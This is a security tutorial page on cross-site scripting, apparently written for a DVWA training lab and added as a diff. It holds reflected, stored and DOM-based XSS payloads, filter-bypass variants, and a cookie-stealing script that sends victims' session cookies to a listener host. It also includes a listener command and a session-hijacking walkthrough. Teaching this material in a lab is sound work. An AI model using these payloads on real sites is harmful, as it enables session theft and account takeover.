@@ -1,0 +1,140 @@
+---
+title: "Tut03: Cross-Site Scripting (XSS)"
+---
+
+Cross-Site Scripting (XSS) occurs when an application includes untrusted user data in a web page without proper escaping, allowing an attacker to inject JavaScript that executes in a victim's browser. The impact ranges from session hijacking to full account takeover.
+
+## Types of XSS
+
+| Type | How it works | Persistence |
+|------|-------------|-------------|
+| **Reflected** | Payload is in the request; output rendered immediately | Not stored |
+| **Stored** | Payload is saved to the database; delivered to all visitors | Stored |
+| **DOM-based** | Payload processed by client-side JavaScript without going to the server | Not stored |
+
+## Reflected XSS
+
+Reflected XSS requires the victim to click a crafted link containing the payload.
+
+Test any input that appears in the response:
+
+```html
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+javascript:alert(1)
+```
+
+In DVWA (Low security), try in the XSS (Reflected) module:
+
+```html
+<script>alert('XSS')</script>
+```
+
+## Stored XSS
+
+Stored XSS is more dangerous because every user who visits the page runs the payload.
+
+In a comment or message field, submit:
+
+```html
+<script>alert('stored xss')</script>
+```
+
+If it executes when anyone views the page, the vulnerability is confirmed.
+
+## Cookie Theft via XSS
+
+The classic payload to steal a session cookie:
+
+```html
+<script>
+  var img = new Image();
+  img.src = 'http://192.168.1.5:8000/steal?c=' + encodeURIComponent(document.cookie);
+</script>
+```
+
+On your attack machine, listen for the request:
+
+```sh
+python3 -m http.server 8000
+```
+
+When a victim visits the page, their cookie appears in your server log:
+
+```
+192.168.1.20 - - [24/Apr/2026 12:00:00] "GET /steal?c=PHPSESSID%3Dabc123 HTTP/1.1" 404 -
+```
+
+Use that session cookie in your browser to hijack their session.
+
+## DOM-based XSS
+
+DOM XSS happens when JavaScript reads attacker-controlled data (e.g., `location.hash`, `location.search`) and writes it to the DOM unsafely.
+
+Example vulnerable code:
+
+```js
+document.getElementById('output').innerHTML = location.hash.substring(1);
+```
+
+Payload in the URL:
+
+```
+http://target.lab/page#<img src=x onerror=alert(1)>
+```
+
+## Bypassing Basic Filters
+
+Applications sometimes filter obvious tags but can be bypassed:
+
+```html
+<!-- Case variation -->
+<ScRiPt>alert(1)</ScRiPt>
+
+<!-- Encoding -->
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+
+<!-- Event handlers (no script tag needed) -->
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<body onresize=alert(1)>
+
+<!-- JavaScript URI -->
+<a href="javascript:alert(1)">click me</a>
+```
+
+Use Burp Repeater to test variations quickly without reloading the page.
+
+## XSS to Account Takeover
+
+With stored XSS and cookie theft, the chain looks like this:
+
+1. Submit XSS payload to a stored field (comment, profile bio, etc.).
+2. A victim (e.g., admin) visits the page.
+3. Their session cookie is sent to your listener.
+4. You import the cookie into your browser using Developer Tools or a cookie editor extension.
+5. Refresh the page — you are now logged in as the victim.
+
+## Mitigation (for Understanding)
+
+XSS is prevented by:
+
+1. **Output encoding** — encode user data before inserting it into HTML, JavaScript, or URLs.
+2. **Content Security Policy (CSP)** — restrict which scripts can execute.
+3. **HttpOnly cookies** — prevent JavaScript from reading session cookies.
+4. **Input validation** — reject or strip dangerous characters at the input boundary.
+
+Look for the absence of `HttpOnly` in `Set-Cookie` headers as a quick indicator.
+
+## Task
+
+> **[Task]** In DVWA, find and exploit both the Reflected and Stored XSS modules at Low security. For the Stored XSS, write a payload that exfiltrates your own session cookie to a listener on your attack machine. Record the payload, the full stolen cookie value, and how you would use it to hijack a session.
+
+## Reference
+
+- [PortSwigger Web Security Academy - XSS](https://portswigger.net/web-security/cross-site-scripting)
+- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
